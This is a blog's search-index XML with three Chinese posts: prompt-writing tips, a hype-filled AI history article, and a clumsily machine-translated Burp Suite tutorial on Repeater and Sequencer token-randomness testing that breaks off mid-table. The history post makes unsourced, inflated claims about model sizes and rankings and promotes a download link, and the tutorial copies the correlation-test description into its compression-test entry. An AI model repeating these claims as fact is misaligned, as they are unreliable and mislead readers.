<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>5个技巧教你如何与AI高效对话，让DeepSeek成为你的超级助手！</title>
      <link href="/smallhao/5%E4%B8%AA%E6%8A%80%E5%B7%A7%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%B8%8EAI%E9%AB%98%E6%95%88%E5%AF%B9%E8%AF%9D%EF%BC%8C%E8%AE%A9DeepSeek%E6%88%90%E4%B8%BA%E4%BD%A0%E7%9A%84%E8%B6%85%E7%BA%A7%E5%8A%A9%E6%89%8B%EF%BC%81/"/>
      <url>/smallhao/5%E4%B8%AA%E6%8A%80%E5%B7%A7%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%B8%8EAI%E9%AB%98%E6%95%88%E5%AF%B9%E8%AF%9D%EF%BC%8C%E8%AE%A9DeepSeek%E6%88%90%E4%B8%BA%E4%BD%A0%E7%9A%84%E8%B6%85%E7%BA%A7%E5%8A%A9%E6%89%8B%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>在这个AI时代，会提问的人已经悄悄领先了。你是不是也遇到过这样的情况：向ChatGPT提问后，得到的回答总是泛泛而谈，或者完全不是你想要的方向？别着急，今天我就来教你5个绝妙技巧，让你的AI对话效率提升300%！</p><h2 id="1-明确具体目标：别让AI猜谜语"><a href="#1-明确具体目标：别让AI猜谜语" class="headerlink" title="1. 明确具体目标：别让AI猜谜语"></a>1. 明确具体目标：别让AI猜谜语</h2><p>想象一下，你对朋友说：”帮我写个方案”，朋友会一头雾水。AI也是一样！缺乏关键约束条件的提问，就像让AI在黑暗中摸索。</p><p>错误示范：”帮我写个推广方案”</p><p>正确姿势：”制定亚马逊新品蓝牙耳机推广方案，包含市场调研方法（竞品分析+用户访谈）、推广阶段划分（预热期-爆发期-长尾期）、风险控制清单（3大主要风险）”</p><p>记住：结构化需求+场景限定&#x3D;可直接落地的方案！AI就像一位经验丰富的顾问，你提供的信息越具体，它给出的建议就越精准。</p><h2 id="2-提供背景信息：别让AI当”读心大师”"><a href="#2-提供背景信息：别让AI当”读心大师”" class="headerlink" title="2. 提供背景信息：别让AI当”读心大师”"></a>2. 提供背景信息：别让AI当”读心大师”</h2><p>你有没有遇到过这种情况？让AI修改文案，结果改得面目全非。问题往往出在——你没告诉它”为谁改””为什么改”。</p><p>错误示范：”修改这个产品说明书”</p><p>正确姿势：”修改智能手环英文产品说明书，目标用户是北美户外运动爱好者，重点突出防水性能（IP68）、GPS轨迹记录和极端温度耐受性（-20°C至50°C），语气要硬核有力”</p><p>就像给设计师brief一样，背景信息越丰富，产出越符合预期。下次提问前，先问问自己：AI需要知道哪些关键信息才能完美完成任务？</p><h2 id="3-分步拆解复杂问题：别一口吃成胖子"><a href="#3-分步拆解复杂问题：别一口吃成胖子" class="headerlink" title="3. 分步拆解复杂问题：别一口吃成胖子"></a>3. 分步拆解复杂问题：别一口吃成胖子</h2><p>面对”如何运营小红书账号”这样的大问题，AI很容易给出教科书式的泛泛回答。解决方法？像吃牛排一样，切成小块慢慢享用！</p><p>错误示范：”怎么运营家居类小红书账号？”</p><p>正确姿势：”Step1 冷启动期：从0到1000粉丝的具体执行方案（包括内容方向、发布时间、互动策略） Step2 爆款内容公式：分析3个竞品爆款笔记的共性特征 Step3 商业变现路径：适合新手家居博主的5种变现方式及操作要点”</p><p>分阶段提问不仅能获得更落地的建议，还能避免信息过载。记住：罗马不是一天建成的，好答案也需要一步步引导出来！</p><h2 id="4-及时反馈修正：把AI当成你的实习生"><a href="#4-及时反馈修正：把AI当成你的实习生" class="headerlink" title="4. 及时反馈修正：把AI当成你的实习生"></a>4. 及时反馈修正：把AI当成你的实习生</h2><p>第一次回答不满意？别放弃！AI就像实习生，需要你的指导和反馈才能越做越好。</p><p>初级回答：”这款防晒霜SPF50+，能有效防护紫外线”</p><p>升级指令：”用李佳琦风格重写防晒霜卖点，增加5个感叹词，补充实验室检测数据（如：8小时持续防护测试结果），加入’OMG’、’买它’等标志性用语”</p><p>通过不断反馈调整，你会发现AI的学习能力超乎想象。就像调教一位天才助手，你的指导越明确，它的表现就越惊艳！</p><h2 id="5-善用追问扩展：挖出AI的隐藏宝藏"><a href="#5-善用追问扩展：挖出AI的隐藏宝藏" class="headerlink" title="5. 善用追问扩展：挖出AI的隐藏宝藏"></a>5. 善用追问扩展：挖出AI的隐藏宝藏</h2><p>得到初步方案后，真正的魔法才刚刚开始！通过精妙的追问，你能解锁AI更深层的智慧。</p><p>经典追问模板：</p><ul><li>“基于这个方案，讨论3个最可能出现的实施风险及应对策略”</li><li>“用SWOT分析法重新解构这个问题”</li><li>“把上述建议提炼为3个可立即执行的动作要点”</li></ul><p>这种对话就像剥洋葱，每一层追问都能发现新的价值。试试看，你会惊讶于AI的深度思考能力！</p><h2 id="实战案例：一次完美对话的全过程"><a href="#实战案例：一次完美对话的全过程" class="headerlink" title="实战案例：一次完美对话的全过程"></a>实战案例：一次完美对话的全过程</h2><p>让我们用一个完整案例展示这些技巧如何协同工作：</p><p>初始提问：”我想在抖音推广新上市的即溶咖啡，给些建议”</p><p>优化后提问：”针对18-30岁都市上班族，制定抖音即溶咖啡推广方案：</p><ol><li>市场调研：快速获取竞品数据的3种方法</li><li>内容策略：适合咖啡产品的3种爆款视频形式</li><li>投放策略：测试期每日预算分配建议 请用年轻化、快节奏的语言风格”</li></ol><p>追问1：”针对上述方案，列出在抖音算法下最可能遇到的2个流量瓶颈及破解方法”</p><p>追问2：”把推广阶段划分为0-1周、1-4周、4周后三个时期，分别给出核心目标和执行重点”</p><p>看到区别了吗？通过精准提问+阶梯式追问，你能获得可直接执行的深度方案，而不是泛泛而谈的建议清单。</p><h2 id="成为AI对话高手的终极心法"><a href="#成为AI对话高手的终极心法" class="headerlink" title="成为AI对话高手的终极心法"></a>成为AI对话高手的终极心法</h2><p>记住这5个技巧只是开始，真正的秘诀在于：</p><ol><li>把AI当同事：清晰传达需求，及时给予反馈</li><li>迭代思维：第一版回答只是原材料，精加工后才会变成珍宝</li><li>保持好奇：不断尝试新的提问方式，发现AI的无限可能</li></ol><p>现在，你已经掌握了与AI高效对话的核心秘籍。下次当ChatGPT的回答不尽如人意时，别急着放弃——用这些技巧再试一次，你会发现一个全新的智能世界！</p><p>行动建议：收藏这篇文章，下次与AI对话时逐条对照实践。坚持一周，你会明显感受到效率的飞跃！</p><p>配上一张流程图，让你们更加直观的观赏</p><p><img src="https://img.smallhao.ddns-ip.net/download.png" alt="图片"></p><p>你平时与AI对话时遇到的最大挑战是什么？在评论区分享，我们一起探讨解决方案！</p>]]></content>
      
      
      <categories>
          
          <category> AI信息 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识分享 </tag>
            
            <tag> 免费分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从图灵测试到GPT-4o：AI用70年完成了人类5000年的“进化</title>
      <link href="/smallhao/%E4%BB%8E%E5%9B%BE%E7%81%B5%E6%B5%8B%E8%AF%95%E5%88%B0GPT-4o%EF%BC%9AAI%E7%94%A870%E5%B9%B4%E5%AE%8C%E6%88%90%E4%BA%86%E4%BA%BA%E7%B1%BB5000%E5%B9%B4%E7%9A%84%E2%80%9C%E8%BF%9B%E5%8C%96/"/>
      <url>/smallhao/%E4%BB%8E%E5%9B%BE%E7%81%B5%E6%B5%8B%E8%AF%95%E5%88%B0GPT-4o%EF%BC%9AAI%E7%94%A870%E5%B9%B4%E5%AE%8C%E6%88%90%E4%BA%86%E4%BA%BA%E7%B1%BB5000%E5%B9%B4%E7%9A%84%E2%80%9C%E8%BF%9B%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p></style></p><p><img src="https://img.smallhao.ddns-ip.net/%E9%97%B4%E8%BD%B4%E4%BF%A1%E6%81%AF%E5%9B%BE%2BAI%E7%94%9F%E6%88%90%E7%82%AB%E9%85%B7%E7%A7%91%E6%8A%80%E6%84%9F%E5%A4%B4%E5%9B%BE%2B%E2%80%9C%E4%BA%BA%E7%B1%BBvsAI%E2%80%9D%E5%AF%B9%E6%AF%94%E8%A1%A8%E6%83%85%E5%8C%85.jpeg" alt="图片"></p><p>开篇：一场跨越世纪的“智商革命”</p><p>1950年，计算机之父图灵提出“图灵测试”，试图回答一个问题：机器能否像人一样思考？<br>74年后，GPT-4o已能流畅对话、编写代码、生成视频，甚至让网友惊呼：“AI比我老板更懂我！”<br>这场悄无声息的“智商革命”，究竟如何改变了人类文明的进程？</p><hr><h3 id="一、AI进化史：从“人工智障”到“人类导师”"><a href="#一、AI进化史：从“人工智障”到“人类导师”" class="headerlink" title="一、AI进化史：从“人工智障”到“人类导师”"></a>一、AI进化史：从“人工智障”到“人类导师”</h3><p>🔍 六个阶段，三次浪潮</p><ul><li>1950-2005 萌芽期：图灵测试点燃火种，CNN卷积神经网络初露锋芒，但AI连“猫狗识别”都费劲。</li><li>2006-2019 沉淀期：Transformer架构横空出世，谷歌用BERT让机器读懂“潜台词”。</li><li>2020至今 爆发期：ChatGPT引爆全球，GPT-4参数飙至1.8万亿，AI智商突破人类本科水平（斯坦福研究）。</li><li>2024年里程碑：中国团队反超！DeepSeek-V3性能碾压GPT-4o，中文理解能力吊打国际大厂。</li></ul><p>未来五年预言：</p><ol><li>通用AI（AGI）初现雏形</li><li>AI接管80%重复性脑力劳动</li><li>“人机共生”成职场新常态</li></ol><hr><h3 id="二、大模型：AI界的“超级大脑”如何炼成？"><a href="#二、大模型：AI界的“超级大脑”如何炼成？" class="headerlink" title="二、大模型：AI界的“超级大脑”如何炼成？"></a>二、大模型：AI界的“超级大脑”如何炼成？</h3><p>🚀 GPT-4的1.8万亿参数是什么概念？<br>相当于把人类5000年文明史的文字压缩成代码，再让AI读100遍！</p><ul><li>涌现能力：突然学会写诗、解方程，像人类“顿悟”。</li><li>泛化能力：看100张猫图，能认出任何品种的猫，包括“炸毛版”。</li></ul><p>烧钱真相：</p><ul><li>训练一次GPT-4：耗电≈1万户家庭一年用电量</li><li>国内大厂现状：算力卡脖子，百模大战烧掉千亿，普通玩家已退场</li></ul><hr><h3 id="三、AI正在抢走谁的饭碗？这些岗位危险了！"><a href="#三、AI正在抢走谁的饭碗？这些岗位危险了！" class="headerlink" title="三、AI正在抢走谁的饭碗？这些岗位危险了！"></a>三、AI正在抢走谁的饭碗？这些岗位危险了！</h3><p>AIGC革命全景图：</p><ul><li>文字：DeepSeek写周报、文心一言写小说，自媒体小编瑟瑟发抖</li><li>图片：文心一格3秒出海报，设计师：“甲方说AI比我便宜”</li><li>视频：Sora生成好莱坞大片，腾讯智影造“数字人主播”，真人演员面临失业潮</li><li>代码：GitHub Copilot写bug（划掉）写代码，程序员：“我现在是AI的翻译官”</li></ul><p>残酷现实：</p><ul><li>国内视频生成模型1分钟烧掉100元，企业级用户才能玩转</li><li>普通人机会：用豆包AI生成Python脚本，副业月入3000攻略（文末送教程）</li></ul><hr><h3 id="四、未来已来：你该如何成为AI时代的“赢家”？"><a href="#四、未来已来：你该如何成为AI时代的“赢家”？" class="headerlink" title="四、未来已来：你该如何成为AI时代的“赢家”？"></a>四、未来已来：你该如何成为AI时代的“赢家”？</h3><ul><li>打工人自救指南：<ol><li>把AI当“超级实习生”：用Copilot十倍提升摸鱼效率</li><li>转型AI训练师：教大模型说人话，年薪50万新职业</li></ol></li><li>创业者机会：<ul><li>数字人直播带货：成本降90%，24小时不下播</li><li>AI+养老&#x2F;教育：下一个万亿蓝海</li></ul></li></ul><hr><h3 id="结语：要么驾驭AI，要么被AI淘汰"><a href="#结语：要么驾驭AI，要么被AI淘汰" class="headerlink" title="结语：要么驾驭AI，要么被AI淘汰"></a>结语：要么驾驭AI，要么被AI淘汰</h3><p>从图灵测试到GPT-4o，AI用70年走完人类千年进化路。<br>2025年，我们正站在历史拐点：</p><ul><li>医生+AI&#x3D;精准诊断</li><li>教师+AI&#x3D;因材施教</li><li>打工人+AI&#x3D;摸鱼自由（误）</li><li>复制链接，打开夸克网盘直接保存<a href="https://pan.quark.cn/s/1f8cf6244933">https://pan.quark.cn/s/1f8cf6244933</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI信息 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识分享 </tag>
            
            <tag> 免费分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite使用介绍（二）</title>
      <link href="/smallhao/BurpSuite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/smallhao/BurpSuite%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Burp Repeater(中继器)是用于手动操作和补发个别HTTP请求，并分析应用程序的响应一个简单的工具。您可以发送一个内部请求从Burp任何地方到Repeater(中继器)，修改请求并且发送它。</p><h3 id="Using-Burp-Repeater"><a href="#Using-Burp-Repeater" class="headerlink" title="Using Burp Repeater"></a>Using Burp Repeater</h3><p>您可以使用中继器用于各种目的，如改变参数值来测试输入为基础的漏洞，发出以特定的顺序要求，以测试逻辑缺陷，并可以多次重发从Burp Scanning results(扫描结果)的要求手动验证报告的问题。</p><p>For example:</p><p><img src="https://wooyun.js.org/images_result/images/2014101712084838980.png" alt="Image001" title="image001.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712084978607.png" alt="Image003" title="image003.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1)可以从Proxy history、site map、Scanner result里地项目地址详情发送到repeater，可以对页面数据进行修改。  </span><br><span class="line">2)点击go，发送请求，右边响应请求。  </span><br><span class="line">3)可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。  </span><br><span class="line">4)单击”x“可以删除当前测试请求页面，.....表示打开新的标签页  </span><br><span class="line">5)底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数  </span><br></pre></td></tr></table></figure><h3 id="Issuing-Requests"><a href="#Issuing-Requests" class="headerlink" title="Issuing Requests"></a>Issuing Requests</h3><p>主中继器的用户界面可让您在多个不同的请求同时工作，每一个在它自己的标签。当你发送请求到中继器，每一件都是在自己的编号标签打开。</p><p>每个选项卡都包含以下项目：</p><p>控制发出请求，然后浏览请求的历史。目标服务器的请求将被发送显示 - 你可以点击目标细节来改变这些。</p><p>HTTP消息中包含的编辑器将发出的请求。您可以编辑该请求，并一遍又一遍地重新发布它。</p><p>HTTP消息编辑器，显示从上次发出的请求接收到的响应。</p><p>开始与中继器工作的最简单的方法是选择要在另一个burp工具（如Proxy history或site map）工作的要求，并在上下文菜单中使用“Send to Repeater(发送到转发器)”选项。这将在中继器创建一个新的请求选项卡，并自动填充目标细节和请求消息的编辑器相关的细节。然后，您可以修改并发出所需的要求。当你的要求准备好发送，点击“go(转到)”按钮，将其发送到服务器。当这个被接收时，与响应长度和一个计时器（以毫秒为单位）一起被显示的响应。您可以使用通常的HTTP消息的编辑功能，以帮助分析请求和响应消息，并开展进一步的行动。</p><h3 id="Request-History"><a href="#Request-History" class="headerlink" title="Request History"></a>Request History</h3><p>每个中继器选项卡维护其自身已在它的请求的历史。您可以点击“ &lt;”和“ &gt; ”按钮来向前和向后导航这段历史，并查看每个请求和响应。您也可以使用下拉按钮以显示历史相邻项的编号列表，并迅速转移给他们。在历史上的任何时候，你可以编辑和重新发布当前显示的请求。</p><h3 id="Repeater-Options"><a href="#Repeater-Options" class="headerlink" title="Repeater Options"></a>Repeater Options</h3><p>Burp Repeater具有控制其行为的各种选项，包括自动更新的Content- Length头的，拆包的压缩内容，和重定向的下面。你可以通过Repeater(中继器)菜单访问这些选项。</p><h3 id="Managing-Request-Tabs"><a href="#Managing-Request-Tabs" class="headerlink" title="Managing Request Tabs"></a>Managing Request Tabs</h3><p>您可以轻松地管理Repeater的request(请求)选项卡。您可以：<br>通过双击该选项卡头重命名标签。<br>通过拖动重新排列标签。<br>通过单击最右侧的“…”选项卡上打开一个新的标签。<br>关闭选项卡单击该选项卡标题中的X按钮。</p><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><p>直放站菜单控制的burpRepeater的行为方面。下列选项可用：</p><p><img src="https://wooyun.js.org/images_result/images/2014101712084995210.png" alt="Image005" title="image005.png"></p><h3 id="Update-Content-length"><a href="#Update-Content-length" class="headerlink" title="Update Content-length"></a>Update Content-length</h3><p>该选项控制Burp是否自动更新的要求在必要的Content-Length头。使用这个选项通常是必不可少的，当请求消息中包含一个身体。</p><h3 id="Unpack-gzip-deflate"><a href="#Unpack-gzip-deflate" class="headerlink" title="Unpack gzip&#x2F;deflate"></a>Unpack gzip&#x2F;deflate</h3><p>该选项控制Burp是否自动解压缩在收到的答复的gzip和deflate压缩内容。</p><h3 id="Follow-redirections"><a href="#Follow-redirections" class="headerlink" title="Follow redirections"></a>Follow redirections</h3><p>此设置控制是否重定向响应会被自动执行。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)Never - 中继器将不会跟随任何重定向。  </span><br><span class="line">2)On-site only - 中继器将只跟随重定向到同一个网页“site”，即使用相同的主机，端口和协议的是在原始请求使用的URL。  </span><br><span class="line">3)In-scope Only - 中继器将只跟随重定向到该套件范围的目标范围之内的URL。  </span><br><span class="line">4)Always - 中继器将跟随重定向到任何URL任何责任。您应使用此选项时应谨慎 - 偶尔，Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击你不想要的。 </span><br></pre></td></tr></table></figure><h3 id="Process-cookies-in-redirections"><a href="#Process-cookies-in-redirections" class="headerlink" title="Process cookies in redirections"></a>Process cookies in redirections</h3><p>如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>此子菜单允许您配置了请求&#x2F;响应面板的布局。您可以在顶部&#x2F;底部，左&#x2F;右拉开，或在选项卡中查看HTTP消息。</p><h3 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h3><p>此子菜单包含相同的选项，可在通过请求和响应消息编辑器的上下文菜单。</p><h3 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h3><p>Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRFtokens，密码重置tokens等。</p><h3 id="Using-Burp-Sequencer"><a href="#Using-Burp-Sequencer" class="headerlink" title="Using Burp Sequencer"></a>Using Burp Sequencer</h3><p>Burp Sequencer是一种用于分析在应用程序的会话tokens，并且意图是不可预测的其他重要数据项的随机性质量的工具。</p><p>使用Sequencer可能会导致在某些应用中意想不到的效果。直到你完全熟悉它的功能和设置，你应该只使用Burp Sequencer对非生产系统。</p><p>要开始去了解Burp Sequencer，执行以下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1)首先，确保Burp已安装并运行，您已配置您的浏览器Burp的工作，并且您已经浏览你的目标应用程序来填充你的代理服务器的历史。  </span><br><span class="line">2)发现发出会话tokens或其他类似的项目，无论是在Set-Cookie头，在一个表单域，或其他地方的代理史上的一个回应。使用上下文菜单中发送的内容到Sequencer。  </span><br><span class="line">3)转到Sequencer选项卡，然后再选择“live capture(现场捕获请求)”，选择你刚才发送的项目。</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712084913630.png" alt="Image007" title="image007.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712085043686.png" alt="Image009" title="image009.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101712085025303.png" alt="Image011" title="image011.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4)在“Token Location Within Response(tokens位置在回应)”部分，选择在tokens出现的响应的位置。如果标记出现在自定义位置（即不是在一个Set-Cookie头或表单域） ，然后选择“Custon location(自定义位置)”选项，然后在对话框中，选择响应tokens，然后单击“确定” 。</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085044724.png" alt="Image013" title="image013.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5)在“Select live Captrue Request(选择现场捕获请求)”部分中，单击“Start live capture(开始实时捕获)”按钮。这将导致Burp反复发出原始请求，并extract(提取)所有在响应收到的tokens。实时捕获会话打开一个新窗口，显示捕获的进度，并已获得的tokens数量。当几百tokens已获得，暂停实时捕获会话，然后单击“Analyze now(立即分析)”按钮。  </span><br><span class="line">6)当分析完成后，会显示出随机性测试的结果。这表明样品中整体摘要，并附有详细的结果为每种类型进行了测试。有简短的文档，结果自己在每个测试。在某些情况下，你可能已经获得tokens的一个合适的样本。您可以手动加载此样品为Sequnecer，并执行相同的分析。要做到这一点，在主burp的UI ，转到序选项卡，然后手动加载子选项卡。您可以从剪贴板粘贴标记，或从文件中加载它们，并使用“Analyze now(立即分析)”按钮，开始装载样品的分析。</span><br></pre></td></tr></table></figure><h3 id="Randomness-Tests"><a href="#Randomness-Tests" class="headerlink" title="Randomness Tests"></a>Randomness Tests</h3><p>Burp Sequencer采用标准统计测试的随机性。这些都是基于对测试的证据试样的假设，并计算发生的观测数据的概率，假设该假说是真实的原则：</p><h3 id="Character-Level-Analysis"><a href="#Character-Level-Analysis" class="headerlink" title="Character-Level Analysis"></a>Character-Level Analysis</h3><p>字符级测试在其原始形式tokens的每个字符位置进行操作。首先，字符设置在每个位置的大小进行计数- 这是出现在每个位置上的取样数据中的不同的字符的数目。然后，下面的测试是使用此信息来进行：</p><p><strong>Character count analysis</strong> - 此测试可分析tokens内使用在各位置中的字符分配。如果样品是随机生成的，所用的字符的分布可能是近似均匀的。在每个位置上，该测试计算，如果tokens是随机产生所观察到的分布的概率。 <strong>Character transition analysis</strong> - 此测试可分析样品中的连续符号之间的转换。如果样品是随机生成的，一个字符出现在一个给定的位置，同样可能被随后的下一个标记由一个用于在该位置上的字符中的任何一个。在每个位置上，该测试计算，如果tokens是随机产生的观察到的转换的概率。</p><p>基于上述试验，character-level analysis(字符级分析)计算整体分数，每个字符位置 - 这是在每个位置由每个字符级测试的计算的最低概率。分析然后计数的有效熵各种显着性水平的位的数目。根据它的字符集的大小，每个位置被分配一个号码的比特（如果有4个字符，3位，如果有8个字符等2位），并且比特的总数等于或高于每显着性水平进行计算。</p><h3 id="Bit-Level-Analysis"><a href="#Bit-Level-Analysis" class="headerlink" title="Bit-Level Analysis"></a>Bit-Level Analysis</h3><p>Bit-level test(位级测试)是比字符级测试功能更强大。启用位级的分析，每个tokens被转换成一组比特，与由字符集的每个字符位置的大小来确定的比特的总数。如果任何职位聘用，其大小不是2的圆形电源的字符集，在该位置的样本数据被转换成其大小是两个最接近的较小的圆形电源的字符集。在该位置的数据的部分比特被有效地合并成从该位置所产生的全部位。这个翻译是在被设计为保留原始样本的随机性特点，不会引入或移除任何偏见的方式进行。然而，这种类型的没有进程可以是完美的，它很可能与分析非圆字符集大小的样本将介绍一些不准确到分析结果的过程。当每个tokens已被转换成一个比特序列，下面的测试是在每个位的位置进行：</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085196363.png" alt="Image015" title="image015.png"></p><p><strong>FIPS monobit test</strong> - 此测试分析的1和0的每个位的位置分布。如果样品是随机产生的，1和0中的数量很可能是近似相等的。在每个位置上测试计算，如果tokens是随机产生所观察到的分布的概率。对于每一个进行的，除了报告中出现的观测数据的概率FIPS测试，Burp Sequncer也记录是否每一位通过或失败的FIPS测试。请注意，通过FIPS标准重新调整Burp Sequencer内任意样本量的工作，而正式规范的FIPS测试假定恰好20,000tokens的样本。因此，如果你希望得到的结果是严格符合FIPS规范，你应该确保你使用的20,000tokens的样本。</p><p><strong>FIPS poker test</strong> - 该测试将所述位序列中的每一个位置转换成的四个连续的，非重叠的组，并导出一个4位的数量从每个组。然后计算每个出现16个可能的数字的数，并进行卡方计算来评估这样的分布。如果样品是随机生成的，四比特数的分布可能是近似均匀的。在每个位置上，该测试计算，如果tokens是随机产生所观察到的分布的概率。<br>FIPS runs tests - 该测试将所述位序列中的每一个位置转换成连续的位具有相同值的运行。然后计算试验次数为1，2，3，4，5，和6及以上的长度。如果样品是随机生成的，运行与每个这些长度的数量很可能是由样本集的大小所确定的范围之内。在每个位置上，该测试计算发生，如果tokens是随机观察到的运行的概率。</p><p><strong>FIPS long runs test</strong> - 这个测试测量位在每个位的位置值相同的最长运行。如果样品是随机生成的，最长的运行很可能是由样本集的大小所确定的范围之内。在每个位置上，该测试计算，如果tokens是随机产生所观察到的最长的概率。需要注意的是符合FIPS规范这个测试仅记录失败，如果位的最长过于漫长。然而，位过于短最长也表明，样品是不是随机的。因此，某些位可能录得显着性水平是低于FIPS传递，即使他们没有严格失败的FIPS检验水平。</p><p><strong>Spectral tests</strong> - 该测试执行在每个位置上的比特序列的复杂的分析，并能够识别非随机性的证据表明，通过其他的统计测试的一些样品中。测试工程通过比特序列以及将每个系列的连续的数字作为一个多维空间的坐标。它绘出的点在此空间由这些坐标来确定每个位置。如果样品是随机生成的，点此空间内的分布可能是大致均匀;在该空间内联网的外观表示该数据很可能是不随机的。在每个位置，测试，计算所观察到的分布存在的，如果tokens是随机的概率。该试验重复进行多种尺寸的数目（1〜8位）和用于多个号码的尺寸（2至6）。</p><p><strong>Correlation test</strong> - 其他各个位级测试工作在采样tokens中的各个位的位置，所以随机性的每个位的位置量计算隔离。仅执行这种类型的测试将防止随机性的tokens作为一个整体金额的任何有意义的评估：包含在每个位置相同的位值标记的样本可能会出现含有比含有不同的值更短的标记的样品更多的熵在每个位置上。因此，有必要以测试在tokens内的不同的位位置中的值之间的任何统计学显著关系。如果样品是随机生成的，在给定的比特位置处的值是同样可能伴随着一个或一个零在任何其它位的位置。在每个位置上，这个测试与计算在出现的其他位置位观察，如果tokens是随机的关系的可能性。为了防止任意的结果，当两个比特之间观察到一定程度的相关性，该测试调整，其显着性水平下是基于所有其他位级测试的位的显着性水平。</p><p><strong>Compressoion test</strong> - 其他各个位级测试工作在采样tokens中的各个位的位置，所以随机性的每个位的位置量计算隔离。仅执行这种类型的测试将防止随机性的tokens作为一个整体金额的任何有意义的评估：包含在每个位置相同的位值标记的样本可能会出现含有比含有不同的值更短的标记的样品更多的熵在每个位置上。因此，有必要以测试在tokens内的不同的位位置中的值之间的任何统计学显著关系。如果样品是随机生成的，在给定的比特位置处的值是同样可能伴随着一个或一个零在任何其它位的位置。在每个位置上，这个测试与计算在出现的其他位置位观察，如果tokens是随机的关系的可能性。为了防止任意的结果，当两个比特之间观察到一定程度的相关性，该测试调整，其显着性水平下是基于所有其他位级测试的位的显着性水平。</p><h3 id="Samples"><a href="#Samples" class="headerlink" title="Samples"></a>Samples</h3><p>在一个应用程序的令牌进行随机试验中，首先有必要获得这些令牌的合适的样品。这可以通过两种方式来完成：通过直接从目标进行标记的自动live capture(实时捕捉)，或通过Manually loading(手动加载)令牌，你已经取得的样本。</p><h3 id="Live-Capture"><a href="#Live-Capture" class="headerlink" title="Live Capture"></a>Live Capture</h3><p>要进行live capture(实时捕捉)，你需要找到一个返回响应的地方，你要分析的session token(会话令牌)或其他项目的目标应用程序中的请求。您可以选择在任何地方Burp的请求，然后从上下文菜单中选择“Send to sequencer(发送到音序器)”选项做到这一点。需要对这个请求来配置实况采集的步骤如下所述。</p><h4 id="i-Select-Live-Capture-Request-实时捕获请求列表中显示已发送到音序器从其他burp工具的要求。选择返回你想要分析的标记或其他项目的要求。"><a href="#i-Select-Live-Capture-Request-实时捕获请求列表中显示已发送到音序器从其他burp工具的要求。选择返回你想要分析的标记或其他项目的要求。" class="headerlink" title="i)Select Live Capture Request - 实时捕获请求列表中显示已发送到音序器从其他burp工具的要求。选择返回你想要分析的标记或其他项目的要求。"></a>i)Select Live Capture Request - 实时捕获请求列表中显示已发送到音序器从其他burp工具的要求。选择返回你想要分析的标记或其他项目的要求。</h4><h4 id="ii-Token-Location-Within-Response-选择令牌出现的应用程序的响应中的位置。"><a href="#ii-Token-Location-Within-Response-选择令牌出现的应用程序的响应中的位置。" class="headerlink" title="ii)Token Location Within Response - 选择令牌出现的应用程序的响应中的位置。"></a>ii)Token Location Within Response - 选择令牌出现的应用程序的响应中的位置。</h4><p>下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie - 如果响应设置的任何cookie，这个选项可以让你选择一个cookie来分析。这是通过会话令牌给客户的最常用方法。  </span><br><span class="line">Form field - 如果响应包含任何HTML表单字段，这个选项可以让你选择一个表单字段的值来分析。这种方法通常用于发送反CSRF令牌和其它每页令牌提供给客户。  </span><br><span class="line">Custom location - 您可以使用此选项来包含要分析的数据的响应中指定一个特定的自定义位置。这是通过使用响应提取规则对话框。</span><br></pre></td></tr></table></figure><h4 id="iii-Live-Capture-Options"><a href="#iii-Live-Capture-Options" class="headerlink" title="iii)Live Capture Options"></a>iii)Live Capture Options</h4><p>这些设置控制用于执行实时捕捉时发出HTTP请求和收获令牌发动机。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 